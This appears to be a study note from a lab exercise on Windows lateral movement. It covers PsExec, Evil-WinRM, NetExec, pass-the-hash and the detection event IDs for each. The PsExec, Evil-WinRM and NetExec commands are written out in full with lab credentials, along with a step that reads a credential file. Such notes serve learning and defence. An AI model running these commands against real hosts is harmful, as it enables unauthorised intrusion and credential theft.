# 🖥️ Remote Execution Methods

> **Topic:** Intro to AD Lateral Movement
>
> **Focus:** PsExec, Evil-WinRM and other Windows remote execution techniques.

---

# 📖 Overview

Remote execution allows commands to be executed on another Windows host through legitimate administrative protocols.

The common requirement is appropriate access on the target.

Most techniques discussed here require local Administrator privileges, while WinRM can also permit members of:

```text
Remote Management Users
```

---

# 1️⃣ PsExec

Impacket's:

```text
psexec.py
```

implements the well-known PsExec technique.

It connects over SMB and:

1. Authenticates to the target.
2. Opens `IPC$`.
3. Accesses `ADMIN$`.
4. Uploads a service executable.
5. Opens the Service Control Manager.
6. Creates a Windows service.
7. Starts the service.
8. Returns an interactive shell.

---

# 🔬 PsExec Under the Hood

```text
SMB :445
   ↓
IPC$
   ↓
ADMIN$
   ↓
Upload Service Binary
   ↓
Service Control Manager
   ↓
CreateServiceW
   ↓
StartServiceW
   ↓
LocalSystem Shell
```

The supplied material identifies Event ID `7045` as an important indicator of new service installation.

---

# ⚠️ Why PsExec Is Noisy

PsExec:

- Writes a file to disk.
- Creates a service.
- Starts a service.
- Generates detectable event log activity.

The resulting shell runs as:

```text
NT AUTHORITY\SYSTEM
```

rather than simply as the authenticated user.

---

# 🧪 Practical Example: NetExec Pre-Check

Before attempting PsExec, verify whether the account has local administrator access:

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc
```

The supplied lab shows:

```text
[+] thm.loc\jdoe:Summer2026! (Pwn3d!)
```

The:

```text
(Pwn3d!)
```

marker indicates local administrative access.

---

# 💻 PsExec Example

```bash
psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
```

The supplied output demonstrates:

```text
[*] Found writable share ADMIN$
[*] Uploading file
[*] Opening SVCManager
[*] Creating service
[*] Starting service
```

Verify:

```cmd
whoami
```

Expected lab result:

```text
nt authority\system
```

---

# 📂 Example: Discovering Additional Loot

Once SYSTEM access is obtained:

```cmd
type C:\Users\Administrator\Documents\loot.txt
```

The supplied lab demonstrates that this file contains a local Administrator NT hash.

This illustrates an important lateral movement pattern:

```text
Remote Execution
      ↓
Higher Privilege
      ↓
Credential Discovery
      ↓
Next Movement Opportunity
```

---

# ⚠️ PsExec Troubleshooting

If PsExec fails or hangs, the supplied material highlights:

- `ADMIN$` is inaccessible.
- Port `445` is blocked.
- The account lacks local Administrator rights.
- SMB signing is enforced.

Pre-check with NetExec before attempting execution.

---

# 2️⃣ Evil-WinRM

**WinRM** is Microsoft's remote management protocol.

Common ports:

```text
HTTP  → 5985
HTTPS → 5986
```

Evil-WinRM provides an interactive PowerShell session over WinRM.

---

# 🔑 Evil-WinRM Requirements

The account must be a member of either:

```text
BUILTIN\Administrators
```

or:

```text
BUILTIN\Remote Management Users
```

This makes WinRM more flexible than PsExec.

---

# 🔄 PsExec vs Evil-WinRM

| Feature | PsExec | Evil-WinRM |
|---|---|---|
| Protocol | SMB | WinRM |
| Typical port | 445 | 5985 / 5986 |
| Shell context | SYSTEM | Authenticated user |
| Local Admin required | Yes | Admin or Remote Management Users |
| Writes service/binary | Yes | No |
| Event 7045 | Yes | No |
| Shell type | CMD/SYSTEM | PowerShell |

---

# 🧪 Evil-WinRM Example

```bash
evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
```

Verify:

```powershell
whoami
```

The supplied lab returns:

```text
thm\jdoe
```

Check the hostname:

```powershell
hostname
```

Result:

```text
SERVER1
```

---

# 🔐 Why Administrator Files Were Inaccessible

The supplied lab demonstrates:

```powershell
type C:\Users\Administrator\Desktop\flag4.txt
```

Result:

```text
Access is denied.
```

This occurs because `jdoe` is not a local Administrator on SERVER1.

The lesson is:

```text
Valid Login
      ≠
Administrative Access
```

---

# 🔑 Evil-WinRM Hash Authentication

The supplied material also shows hash-based authentication:

```bash
evil-winrm -i TARGET -u Administrator -H NTLM_HASH
```

This makes Evil-WinRM useful in Pass-the-Hash workflows.

---

# 3️⃣ Other Remote Execution Methods

| Method | Tool | Mechanism | Noise / Detection |
|---|---|---|---|
| WMI | `wmiexec.py` | DCOM `Win32_Process.Create` | Lower; no service installation |
| DCOM | `dcomexec.py` | DCOM objects | Low |
| SMBExec | `smbexec.py` | Service + `cmd.exe` | Medium; Event 7045 |
| AtExec | `atexec.py` | Task Scheduler RPC | Medium; Event 4698 |
| RDP | `xfreerdp` / `rdesktop` | GUI remote desktop | High; Event 4624 Type 10 |
| NetExec | `nxc` | SMB command execution | Varies |

---

# 🧰 NetExec Quick Commands

CMD:

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -x 'whoami /all'
```

PowerShell:

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -X '$PSVersionTable'
```

---

# 📊 Detection at a Glance

| Event ID | Log | Meaning |
|---|---|---|
| `4624 Type 3` | Security | Network logon |
| `4648` | Security | Explicit credentials |
| `7045` | System | New service installed |
| `4697` | Security | Service installed |
| `4698` | Security | Scheduled task created |
| `4688` | Security | Process creation |

The supplied material identifies `7045` plus a short randomised service name as a strong PsExec indicator.

---

# 💡 Key Takeaways

- PsExec uses SMB, ADMIN$ and the Service Control Manager.
- PsExec commonly results in a SYSTEM shell.
- Evil-WinRM provides a PowerShell session as the authenticated user.
- WinRM can work with Remote Management Users.
- WMI, DCOM, SMBExec and AtExec provide alternative execution paths.
- NetExec is useful for quick validation and command execution.
- Every technique has a different forensic footprint.
